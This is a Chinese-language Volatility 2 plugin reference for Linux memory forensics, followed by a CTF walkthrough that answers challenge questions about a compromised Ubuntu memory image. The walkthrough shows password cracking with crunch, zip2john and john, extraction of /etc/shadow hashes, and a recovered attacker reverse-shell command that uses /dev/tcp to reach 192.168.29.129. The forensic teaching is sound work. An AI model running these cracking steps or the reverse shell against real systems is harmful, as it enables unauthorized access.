lo               127.0.0.1            00:00:00:00:00:00  False          
ens33            192.168.29.150       00:0c:29:21:4f:37  False          
lo               127.0.0.1            00:00:00:00:00:00  False          
```



### linux_netstat

列出打开的网络套接字

```
vol2 -f ... --profile=... linux_netstat
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_netstat
```

```
UNIX 41476              systemd/1     /run/systemd/journal/stdout
UNIX 41477              systemd/1     /run/systemd/journal/stdout
UNIX 12266              systemd/1     /run/systemd/journal/dev-log
UNIX 12275              systemd/1     /run/systemd/fsck.progress
UNIX 12277              systemd/1     /run/udev/control
UNIX 12279              systemd/1     /run/systemd/journal/syslog
UDP      127.0.0.53      :   53 0.0.0.0         :    0                   systemd-resolve/490  
TCP      127.0.0.53      :   53 0.0.0.0         :    0 LISTEN            systemd-resolve/490  
UNIX 30640                cupsd/643   
TCP      ::1             :  631 ::              :    0 LISTEN                      cupsd/643  
TCP      127.0.0.1       :  631 0.0.0.0         :    0 LISTEN                      cupsd/643  
UNIX 29951                acpid/646   /run/acpid.socket
UNIX 31377         avahi-daemon/648   
UDP      0.0.0.0         : 5353 0.0.0.0         :    0                      avahi-daemon/648  
UDP      ::              : 5353 ::              :    0                      avahi-daemon/648  
UDP      0.0.0.0         :52962 0.0.0.0         :    0                      avahi-daemon/648  
UDP      ::              :51469 ::              :    0                      avahi-daemon/648  
UNIX 30386         avahi-daemon/652   
TCP      192.168.29.150  :   22 192.168.29.1    :57386 ESTABLISHED                  sshd/2149 
UNIX 162186                sshd/2149  
TCP      192.168.29.150  :   22 192.168.29.1    :57394 ESTABLISHED                  sshd/2222 
UNIX 161708                sshd/2222  
TCP      ::1             : 6010 ::              :    0 LISTEN                       sshd/2222 
TCP      127.0.0.1       : 6010 0.0.0.0         :    0 LISTEN                       sshd/2222 
TCP      192.168.29.150  :   22 192.168.29.1    :57395 ESTABLISHED                  sshd/2224 
UNIX 162348                sshd/2224  
```



### linux_list_raw

列出使用混杂模式套接字的应用程序

```
vol2 -f ... --profile=... linux_list_raw
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_list_raw
```

```
Process          PID    File Descriptor Inode             
---------------- ------ --------------- ------------------
dhclient            766               5              34844
```



### linux_find_file

列出并恢复内存中的文件

```
vol2 -f ... --profile=... linux_find_file [options]

  -F FIND, --find=FIND  查找文件（路径）
  -i INODE, --inode=INODE
                        写入磁盘的inode
  -O OUTFILE, --outfile=OUTFILE
                        输出文件路径
  -L, --listfiles       列出内存中缓存的所有文件
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -L
```

```
Inode Number                  Inode File Path
---------------- ------------------ ---------
               2 0xffff90ee3374ad70 /run/user/1000
              33 0xffff90edb4892d70 /run/user/1000/update-notifier.pid
              27 0xffff90ee29c3c3f0 /run/user/1000/pulse
              11 0xffff90ee2cc55a70 /run/user/1000/gnupg/S.gpg-agent
              10 0xffff90ee2cc565b0 /run/user/1000/gnupg/S.gpg-agent.browser
```



### linux_enumerate_files

枚举文件系统缓存引用的文件

```
vol2 -f ... --profile=... linux_enumerate_files
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_enumerate_files
```

```
     Inode Address Inode Number              Path
------------------ ------------------------- ----
0xffff90ee3374ad70                         2 /run/user/1000
0xffff90edb4892d70                        33 /run/user/1000/update-notifier.pid
0xffff90ee29c3c3f0                        27 /run/user/1000/pulse
0xffff90ee0443f0f0                        30 /run/user/1000/pulse/native
0xffff90ee0443a230                        29 /run/user/1000/pulse/pid
0xffff90ee2ea85200                        25 /run/user/1000/gnome-shell
0xffff90ee2e89e2e0                        26 /run/user/1000/gnome-shell/runtime-state-LE.:0
```



### linux_elfs

在进程映射中查找 ELF 二进制文件

```
vol2 -f ... --profile=... linux_elfs

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_elfs
```

![image-20250311112303333](./images/volatility%202.assets/image-20250311112303333.png)



### linux_kernel_opened_files

列出内核打开的文件

```
vol2 -f ... --profile=... linux_kernel_opened_files
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64  linux_kernel_opened_files
```

```
Offset (V)         Partial File Path
------------------ -----------------
[无内容]
```



### linux_library_list

列出进程加载的库

```
vol2 -f ... --profile=... linux_library_list

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_library_list
```

```
Task             Pid      Load Address       Path
---------------- -------- ------------------ ----
systemd                 1 0x00007fa187840000 /lib/x86_64-linux-gnu/libm.so.6
systemd                 1 0x00007fa187bde000 /lib/x86_64-linux-gnu/libudev.so.1
systemd                 1 0x00007fa187dfc000 /lib/x86_64-linux-gnu/libgpg-error.so.0
systemd                 1 0x00007fa188011000 /lib/x86_64-linux-gnu/libjson-c.so.3
systemd                 1 0x00007fa18821c000 /usr/lib/x86_64-linux-gnu/libargon2.so.0
systemd                 1 0x00007fa188425000 /lib/x86_64-linux-gnu/libdevmapper.so.1.02.1
systemd                 1 0x00007fa188690000 /lib/x86_64-linux-gnu/libattr.so.1
systemd                 1 0x00007fa188895000 /lib/x86_64-linux-gnu/libcap-ng.so.0
```



### linux_librarydump

将进程内存中的共享库转储到磁盘

```
vol2 -f ... --profile=... linux_librarydump

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
  -D DUMP_DIR, --dump-dir=DUMP_DIR
                        输出目录
  -b BASE, --base=BASE  转储具有基地址的驱动（十六进制）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_librarydump -b 0x00007fa18821c000 -D out
```

```
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff90ee38802e80 systemd              1               0x00007fa18821c000 out/systemd.1.0x7fa18821c000
```

```
file systemd.1.0x7fa18821c000

systemd.1.0x7fa18821c000: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```



### linux_lsof

列出文件描述符及其路径

```
vol2 -f ... --profile=... linux_lsof [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
Offset             Name                           Pid      FD       Path
------------------ ------------------------------ -------- -------- ----
0xffff90ee38802e80 systemd                               1        0 /dev/null
0xffff90ee34bbc5c0 avml-x86_64                        2364        4 /root/linux_memory/capture/hil-virtual-machine-2023-09-08_11.18.30/hil-virtual-machine-2023-09-08_11.18.30-memory.lime
0xffff90ee04435d00 gpg                                2368        0 /dev/null
0xffff90ee04435d00 gpg                                2368        1 /root/nohup.out
0xffff90ee04435d00 gpg                                2368        2 /root/nohup.out
0xffff90ee04435d00 gpg                                2368        3 /root/wlaq.txt
```



### linux_memmap

转储 Linux 任务的内存映射

```
vol2 -f ... --profile=... linux_memmap [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_memmap
```

```
Task             Pid      Virtual            Physical                         Size
---------------- -------- ------------------ ------------------ ------------------
systemd                 1 0x00005604fd82a000 0x000000013a1f7000             0x1000
systemd                 1 0x00005604fd82b000 0x000000013a077000             0x1000
systemd                 1 0x00005604fd82c000 0x0000000139ff7000             0x1000
systemd                 1 0x00005604fd82d000 0x000000013a0b7000             0x1000
systemd                 1 0x00005604fd82e000 0x000000013ba37000             0x1000
```



### linux_mount

收集挂载的文件系统/设备

```
vol2 -f ... --profile=... linux_mount [options]
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_mount
```

```
Volatility Foundation Volatility Framework 2.6.1
tmpfs                     /run/user/1000                      tmpfs        rw,relatime,nosuid,nodev         
proc                      /proc                               proc         rw,relatime,nosuid,nodev,noexec   
/dev/loop7                /snap/core20/1081                   squashfs     ro,relatime,nodev                 
tracefs                   /sys/kernel/debug/tracing           tracefs      rw,relatime                       
/dev/sda1                 /                                   ext4         rw,relatime                       
tmpfs                     /sys/fs/cgroup                      tmpfs        ro,nosuid,nodev,noexec           
```



### linux_mount_cache

从 kmem_cache 收集挂载信息

```
vol2 -f ... --profile=... linux_mount_cache [options]
```



## Windows



## 题目

### Linux内存取证

导入 Profile，将文件 **ubuntu18.zip** 导入到 **volatility/plugins/overlays/linux** 文件夹中，并使用 **vol2 --info** 验证。

```
vol2 --info

Profiles
--------
Linuxubuntu18x64      - A Profile for Linux ubuntu18 x64
...
```



**一、请提交用户目录下压缩包中 flag.txt 文件内容**

导出内存中的所有文件路径，保存到 file 文件中。

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -L > file
```



过滤 file 文件中的内容，使用关键字 **/home/** 和 **zip**。

```
cat file | grep /home/ | grep zip

----------------                0x0 /home/hil/unzip
         3670125 0xffff90ed83f58978 /home/hil/flag.zip
```



将文件从内存文件中导出到本地磁盘。

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -i 0xffff90ed83f58978 -O flag.zip
```

```
file flag.zip

flag.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```



尝试进行解压，提示需要密码。

```
unzip flag.zip 

Archive:  flag.zip
[flag.zip] flag.txt password: 
```



使用 crunch 工具生成 8 位纯数字密码全部组合的字典。

```
crunch  8 8 -t %%%%%%%% > passwd.txt

858 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100000000 
```



使用 zip2john 工具提取压缩包的 hash 值到文件中。

```
zip2john flag.zip > hash.txt
```



通过 john 工具，使用生成的密码字典进行爆破，获得压缩包密码（**20230309**）

```
john --wordlist=passwd.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
20230309         (flag.zip/flag.txt)     
1g 0:00:00:01 DONE (2025-03-11 14:30) 0.7519g/s 15213Kp/s 15213Kc/s 15213KC/s 20217856..20234239
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```



使用密码解压压缩包，获取 flag.txt 中的值。

```
unzip flag.zip 

Archive:  flag.zip
[flag.zip] flag.txt password: 
  inflating: flag.txt
```

```
cat flag.txt

flag{welcome_y3h8aq2}
```



答案：**flag{welcome_y3h8aq2}**



**二、请提交 root 用户的登录密码**

获取 root 用户的密码，一般情况下都是获取 **/etc/shadow** 文件中 root 密码的 hash 值，并使用字典进行爆破。



获取 root 密码的 hash 值的方式有很多中，/etc/shadow 文件几乎 100% 会被明文加载到内存中，最简单的方式是使用 strings 命令输出整个内存文件中的字符串，并根据 /etc/shadow 文件存储内容的结构，使用正则表达式进行过滤。

```
strings linux | grep -e "root:.*:::"

root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
```



刚才使用 **linux_find_file** 插件获取了内存中所有文件位置，使用 **/etc/shadow** 关键字进行过滤，获取 **INODE**，然后从内存中导出 **/etc/shadow** 文件。

```
cat file | grep /etc/shadow

          262337 0xffff90ed83070530 /etc/shadow-
          263668 0xffff90ee35c14568 /etc/shadow
```

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -i 0xffff90ee35c14568 -O shadow
```

```
cat shadow

root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
sys:*:18885:0:99999:7:::
sync:*:18885:0:99999:7:::
games:*:18885:0:99999:7:::
man:*:18885:0:99999:7:::
lp:*:18885:0:99999:7:::
mail:*:18885:0:99999:7:::
news:*:18885:0:99999:7:::
uucp:*:18885:0:99999:7:::
proxy:*:18885:0:99999:7:::
www-data:*:18885:0:99999:7:::
backup:*:18885:0:99999:7:::
list:*:18885:0:99999:7:::
irc:*:18885:0:99999:7:::
gnats:*:18885:0:99999:7:::
nobody:*:18885:0:99999:7:::
systemd-network:*:18885:0:99999:7:::
systemd-resolve:*:18885:0:99999:7:::
syslog:*:18885:0:99999:7:::
messagebus:*:18885:0:99999:7:::
_apt:*:18885:0:99999:7:::
uuidd:*:18885:0:99999:7:::
avahi-autoipd:*:18885:0:99999:7:::
usbmux:*:18885:0:99999:7:::
dnsmasq:*:18885:0:99999:7:::
rtkit:*:18885:0:99999:7:::
cups-pk-helper:*:18885:0:99999:7:::
speech-dispatcher:!:18885:0:99999:7:::
whoopsie:*:18885:0:99999:7:::
kernoops:*:18885:0:99999:7:::
saned:*:18885:0:99999:7:::
avahi:*:18885:0:99999:7:::
colord:*:18885:0:99999:7:::
hplip:*:18885:0:99999:7:::
geoclue:*:18885:0:99999:7:::
pulse:*:18885:0:99999:7:::
gnome-initial-setup:*:18885:0:99999:7:::
gdm:*:18885:0:99999:7:::
hil:$6$F1jR4mYh$/tNxOqY2kmxTEo1yBHcSRpaJKj164FAjgW0KIOyu3.AY9.t0sZri5/8/LnDxQTU/Cj3z68kIZy8FhCoYlBs4o.:19581:0:99999:7:::
sshd:*:19581:0:99999:7:::
```



将 root 用户的信息复制到一个单独的文件中，使用 rockyou 字典进行爆破。

```
john --wordlist=rockyou.txt root_pass
```

```
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
ABCabc123        (root)     
1g 0:00:00:04 DONE (2025-03-11 15:05) 0.2024g/s 10986p/s 10986c/s 10986C/s sooty123..250895
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```



答案：**ABCabc123**



**三、请指出攻击者使用什么命令实现提权操作**

使用 linux_bash 插件导出执行的命令

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_bash
```

```
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1831 bash                 2023-09-08 03:14:52 UTC+0000   find / -perm -4000 -exec ls -la {} \; 2>/dev/null 
    1831 bash                 2023-09-08 03:14:52 UTC+0000   0
    1831 bash                 2023-09-08 03:15:05 UTC+0000   sudo su
    1831 bash                 2023-09-08 03:15:29 UTC+0000   find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.29.129/7777 0>&1 \;
    2020 bash                 2023-09-08 03:15:33 UTC+0000   whoami
    2020 bash                 2023-09-08 03:15:35 UTC+0000   cat /etc/shadow
    2020 bash                 2023-09-08 03:16:01 UTC+0000   cp /etc/shadow /home/hil/
    2020 bash                 2023-09-08 03:16:07 UTC+0000   cat /home/hil/shadow
    2093 bash                 2023-09-08 03:16:30 UTC+0000   USER=root
    2093 bash                 2023-09-08 03:16:30 UTC+0000   ls
    2093 bash                 2023-09-08 03:16:48 UTC+0000   nohup python3 powershell.py &
    2093 bash                 2023-09-08 03:16:59 UTC+0000   vim powershell.py 
    2093 bash                 2023-09-08 03:17:14 UTC+0000   nohup python3 powershell.py &
    2093 bash                 2023-09-08 03:17:25 UTC+0000   ls
    2093 bash                 2023-09-08 03:17:37 UTC+0000   USER=root
    2093 bash                 2023-09-08 03:17:37 UTC+0000   ls
    2093 bash                 2023-09-08 03:17:37 UTC+0000   cd /home/hil/
    2093 bash                 2023-09-08 03:17:44 UTC+0000   nano shadow 
    2093 bash                 2023-09-08 03:17:44 UTC+0000   s
    2196 bash                 2023-09-08 03:18:00 UTC+0000   USER=root
    2196 bash                 2023-09-08 03:18:00 UTC+0000   ls
    2196 bash                 2023-09-08 03:18:02 UTC+0000   cd /home/hil/
    2196 bash                 2023-09-08 03:18:03 UTC+0000   ls
    2196 bash                 2023-09-08 03:18:05 UTC+0000   unzip flag.zip 
    2196 bash                 2023-09-08 03:18:05 UTC+0000   ???B6V
    2288 bash                 2023-09-08 03:18:26 UTC+0000   cd linux_memory/
    2288 bash                 2023-09-08 03:18:30 UTC+0000   ./lmg -y
```



答案：**find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.29.129/7777 0>&1 \;**



**四、请指出内存中恶意进程的 PID**

在 **linux_bash** 插件输出的结果中发现 **nohup python3 powershell.py &**，使用 pslist 查看进程 ID。

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pslist | grep powershell
```

```
0xffff90edaf8445c0 powershell           2132            2093            0               0      0x0000000061efe000 2023-09-08 03:17:27 UTC+0000
```



答案：**2132**



**五、请指出恶意进程加密文件后的文件类型**

查看恶意进程有哪些子进程。

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pstree -p 2132
```

```
Name                 Pid             Uid            
powershell           2132                           
.gpg                 2368                           
```



使用 linux_psaux 查看启动进程时使用的详细参数。

```
Pid    Uid    Gid    Arguments                                                       
2132   0      0      powershell                                                      
2368   0      0      gpg --output wlaq.txt.gpg --encrypt --recipient chinaskills@163.com wlaq.txt
```



答案：gpg